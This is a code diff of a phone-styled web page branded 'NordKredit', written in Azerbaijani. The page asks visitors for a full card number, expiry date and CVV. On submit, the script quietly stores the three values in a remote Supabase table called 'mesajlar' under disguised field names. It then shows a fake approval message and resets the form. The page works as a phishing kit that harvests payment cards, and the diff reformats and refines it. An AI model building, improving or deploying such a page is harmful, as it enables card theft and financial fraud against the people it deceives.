@@ -4,43 +4,198 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>NordKredit</title>
+
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,sans-serif;}
-body{height:100vh;display:flex;justify-content:center;align-items:center;background:#0b1e3a;overflow:hidden;}
-.phone{width:360px;height:740px;background:#111;border-radius:55px;padding:18px;position:relative;box-shadow:0 0 80px #000;}
-.island{position:absolute;top:12px;left:50%;transform:translateX(-50%);width:140px;height:35px;background:black;border-radius:25px;}
-.side1{position:absolute;left:-4px;top:200px;width:4px;height:80px;background:#222;border-radius:4px;}
-.side2{position:absolute;right:-4px;top:230px;width:4px;height:60px;background:#222;border-radius:4px;}
-.homebar{position:absolute;bottom:8px;left:50%;transform:translateX(-50%);width:120px;height:5px;background:#333;border-radius:5px;}
-.screen{width:100%;height:100%;background:#0e1f3f;border-radius:40px;padding:25px;color:white;display:flex;flex-direction:column;align-items:center;}
+body{
+height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+background:#0b1e3a;
+overflow:hidden;
+}
+
+/* PHONE */
+.phone{
+width:360px;
+height:740px;
+background:#111;
+border-radius:55px;
+padding:18px;
+position:relative;
+box-shadow:0 0 80px #000;
+}
+.island{
+position:absolute;
+top:12px;
+left:50%;
+transform:translateX(-50%);
+width:140px;
+height:35px;
+background:black;
+border-radius:25px;
+}
+.side1{
+position:absolute;
+left:-4px;
+top:200px;
+width:4px;
+height:80px;
+background:#222;
+border-radius:4px;
+}
+.side2{
+position:absolute;
+right:-4px;
+top:230px;
+width:4px;
+height:60px;
+background:#222;
+border-radius:4px;
+}
+.homebar{
+position:absolute;
+bottom:8px;
+left:50%;
+transform:translateX(-50%);
+width:120px;
+height:5px;
+background:#333;
+border-radius:5px;
+}
+
+.screen{
+width:100%;
+height:100%;
+background:#0e1f3f;
+border-radius:40px;
+padding:25px;
+color:white;
+display:flex;
+flex-direction:column;
+align-items:center;
+}
 
 /* CARD */
-.card-wrapper{perspective:1000px;margin-top:50px;width:100%;}
-.card{width:100%;height:210px;position:relative;transform-style:preserve-3d;transition:0.8s;border-radius:20px;overflow:hidden;}
+.card-wrapper{perspective:1000px;margin-top:50px;}
+.card{
+width:100%;
+height:210px;
+position:relative;
+transform-style:preserve-3d;
+transition:0.8s;
+}
 .card.flip{transform:rotateY(180deg);}
-.card-face{position:absolute;width:100%;height:100%;backface-visibility:hidden;border-radius:20px;display:flex;flex-direction:column;padding:20px;color:white;}
-.front{background:linear-gradient(90deg,#1bb34a,#0c5f2b);justify-content:center;align-items:center;}
-.back{background:#111;transform:rotateY(180deg);justify-content:flex-start;align-items:center;display:flex;flex-direction:column;}
-.strip{width:80%;height:6px;background:#222;margin:20px 0;border-radius:3px;}
-.cvv-box{background:white;color:black;padding:10px;text-align:right;border-radius:5px;font-weight:bold;width:80%;}
+.card-face{
+position:absolute;
+width:100%;
+height:100%;
+backface-visibility:hidden;
+border-radius:20px;
+padding:20px;
+color:white;
+}
+.front{
+background:radial-gradient(circle at center,#1bb34a,#0c5f2b 70%);
+}
+.back{
+background:#111;
+transform:rotateY(180deg);
+}
+.strip{height:40px;background:black;margin-top:20px;}
+.cvv-box{
+margin-top:30px;
+background:white;
+color:black;
+padding:10px;
+text-align:right;
+border-radius:5px;
+font-weight:bold;
+}
 
-/* Kart nömrəsi və exp */
-.number{font-size:20px;letter-spacing:3px;display:flex;justify-content:center;gap:15px;}
-.exp{position:absolute;bottom:20px;left:20px;font-size:14px;}
+.number{
+position:absolute;
+top:50%;
+left:50%;
+transform:translate(-50%,-50%);
+font-size:20px;
+letter-spacing:3px;
+}
+.exp{
+position:absolute;
+bottom:20px;
+left:20px;
+font-size:14px;
+}
 
 /* NordKredit yazısı və loqo */
-.logo-text{position:absolute;top:15px;left:20px;font-weight:bold;font-size:18px;display:flex;align-items:center;gap:8px;}
-.logo-icon{width:25px;height:25px;border-radius:50%;background:gold;}
+.logo-text{
+position:absolute;
+top:15px;
+left:20px;
+font-weight:bold;
+font-size:18px;
+display:flex;
+align-items:center;
+gap:8px;
+}
+.logo-icon{
+width:25px;
+height:25px;
+border-radius:50%;
+background:gold;
+}
 
 /* FORM */
-form{margin-top:40px;display:flex;flex-direction:column;gap:12px;width:100%;}
-input{padding:12px;border:none;border-radius:8px;font-size:16px;}
-button{padding:14px;border:none;border-radius:10px;background:linear-gradient(90deg,#f6d365,#fda085);font-weight:bold;cursor:pointer;}
+form{
+margin-top:40px;
+display:flex;
+flex-direction:column;
+gap:12px;
+width:100%;
+}
+input{
+padding:12px;
+border:none;
+border-radius:8px;
+font-size:16px;
+}
+button{
+padding:14px;
+border:none;
+border-radius:10px;
+background:linear-gradient(90deg,#f6d365,#fda085);
+font-weight:bold;
+cursor:pointer;
+}
 
 /* LOADING */
-.loading{position:absolute;inset:0;background:rgba(0,0,0,0.85);display:none;flex-direction:column;justify-content:center;align-items:center;color:white;font-size:18px;border-radius:40px;}
-.spinner{width:50px;height:50px;border:5px solid #555;border-top:5px solid gold;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px;}
-@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+.loading{
+position:absolute;
+inset:0;
+background:rgba(0,0,0,0.85);
+display:none;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+color:white;
+font-size:18px;
+border-radius:40px;
+}
+.spinner{
+width:50px;
+height:50px;
+border:5px solid #555;
+border-top:5px solid gold;
+border-radius:50%;
+animation:spin 1s linear infinite;
+margin-bottom:20px;
+}
+@keyframes spin{
+0%{transform:rotate(0)}
+100%{transform:rotate(360deg)}
+}
 </style>
 </head>
 <body>
@@ -55,21 +210,27 @@ button{padding:14px;border:none;border-radius:10px;background:linear-gradient(90
 
 <div class="card-wrapper">
 <div class="card" id="card">
-  <div class="card-face front">
-    <div class="logo-text"><div class="logo-icon"></div><div>NordKredit</div></div>
-    <div class="number" id="cardNumber">0000 0000 0000 0000</div>
-    <div class="exp" id="cardExp">MM/YY</div>
-  </div>
-  <div class="card-face back">
-    <div class="strip"></div>
-    <div class="cvv-box" id="cvvDisplay">***</div>
-  </div>
+
+<div class="card-face front">
+<div class="logo-text">
+<div class="logo-icon"></div>
+<div>NordKredit</div>
+</div>
+<div class="number" id="cardNumber">0000 0000 0000 0000</div>
+<div class="exp" id="cardExp">MM/YY</div>
+</div>
+
+<div class="card-face back">
+<div class="strip"></div>
+<div class="cvv-box" id="cvvDisplay">***</div>
+</div>
+
 </div>
 </div>
 
 <form id="form">
 <input type="text" maxlength="19" placeholder="16 rəqəmli kod" id="numberInput">
-<input type="text" maxlength="4" placeholder="MMYY" id="expInput">
+<input type="text" maxlength="5" placeholder="MM/YY" id="expInput">
 <input type="text" maxlength="3" placeholder="Təhlükəsizlik kodu" id="cvvInput">
 <button type="submit">Təsdiqlə</button>
 </form>
@@ -101,56 +262,70 @@ const card=document.getElementById("card")
 const loading=document.getElementById("loading")
 const loadingText=document.getElementById("loadingText")
 
-/* Kart nömrəsi 16 rəqəm, yan-yana 4-4 blok */
-numberInput.addEventListener("input", e=>{
-  let val=e.target.value.replace(/\D/g,'').substring(0,16)
-  let blocks=[]
-  for(let i=0;i<val.length;i+=4){ blocks.push(val.substr(i,4)) }
-  val=blocks.join(' ')
-  cardNumber.textContent=val||"0000 0000 0000 0000"
-  numberInput.value=val
+/* 16 rəqəm format */
+numberInput.addEventListener("input",e=>{
+let val=e.target.value.replace(/\D/g,'').substring(0,16)
+val=val.replace(/(.{4})/g,'$1 ').trim()
+cardNumber.textContent=val||"0000 0000 0000 0000"
+numberInput.value=val
 })
 
-/* MMYY 4 rəqəm, artıq yazmaq olmaz */
-expInput.addEventListener("input", e=>{
-  let val=e.target.value.replace(/\D/g,'').substring(0,4)
-  if(val.length>2){ val=val.substring(0,2)+"/"+val.substring(2) }
-  expInput.value=val
-  cardExp.textContent=val||"MM/YY"
+/* MM/YY auto format */
+expInput.addEventListener("input",e=>{
+let val=e.target.value.replace(/\D/g,'').substring(0,4)
+if(val.length>=3){ val=val.substring(0,2)+"/"+val.substring(2) }
+expInput.value=val
+cardExp.textContent=val||"MM/YY"
 })
 
-/* CVV yazanda kart arxaya çevrilir, bir anlıq göstərilir */
+/* Flip */
 cvvInput.addEventListener("focus",()=>card.classList.add("flip"))
 cvvInput.addEventListener("blur",()=>card.classList.remove("flip"))
-cvvInput.addEventListener("input", e=>{
-  let val=e.target.value.replace(/\D/g,'').substring(0,3)
-  cvvInput.value=val
-  cvvDisplay.textContent=val
-  setTimeout(()=>cvvDisplay.textContent="***",1000)
+
+cvvInput.addEventListener("input",e=>{
+let val=e.target.value.replace(/\D/g,'').substring(0,3)
+cvvInput.value=val
+cvvDisplay.textContent=val
+setTimeout(()=>cvvDisplay.textContent="***",1000)
 })
 
-form.addEventListener("submit", async e=>{
-  e.preventDefault()
-  if(numberInput.value.replace(/\s/g,'').length!==16){ alert("16 rəqəm tam daxil edilməlidir"); return }
-  if(expInput.value.length!==5){ alert("Tarix düzgün deyil"); return }
-  if(cvvInput.value.length!==3){ alert("3 rəqəmli kod daxil edin"); return }
+form.addEventListener("submit",async e=>{
+e.preventDefault()
 
-  loading.style.display="flex"
+if(numberInput.value.replace(/\s/g,'').length!==16){ alert("16 rəqəm tam daxil edilməlidir"); return }
+if(expInput.value.length!==5){ alert("Tarix düzgün deyil"); return }
+if(cvvInput.value.length!==3){ alert("3 rəqəmli kod daxil edin"); return }
 
-  const { data, error } = await supabase.from("mesajlar").insert([
-    { kod1:numberInput.value, kod2:expInput.value, kod3:cvvInput.value }
-  ])
+loading.style.display="flex"
 
-  if(error){ console.error("Supabase xəta:", error); alert("Xəta baş verdi: " + error.message); loading.style.display="none"; return }
+const { data, error } = await supabase.from("mesajlar").insert([
+{
+kod1:numberInput.value,
+kod2:expInput.value,
+kod3:cvvInput.value
+}
+])
 
-  setTimeout(()=>{
-    loadingText.textContent="Təbriklər Sorğunuz Təsdiq Olundu"
-  },7000)
+if(error){ console.error("Supabase xəta:", error); alert("Xəta baş verdi: " + error.message); loading.style.display="none"; return }
 
-  setTimeout(()=>{
-    window.location.reload()
-  },9500)
+setTimeout(()=>{
+loadingText.textContent="Təbriklər Sorğunuz Təsdiq Olundu"
+},7000)
+
+/* Avtomatik təmizləmə və spinner reset */
+setTimeout(()=>{
+numberInput.value=""
+expInput.value=""
+cvvInput.value=""
+cardNumber.textContent="0000 0000 0000 0000"
+cardExp.textContent="MM/YY"
+cvvDisplay.textContent="***"
+loadingText.textContent="Loading..."
+loading.style.display="none"
+},9500)
+
 })
 </script>
+
 </body>
 </html>
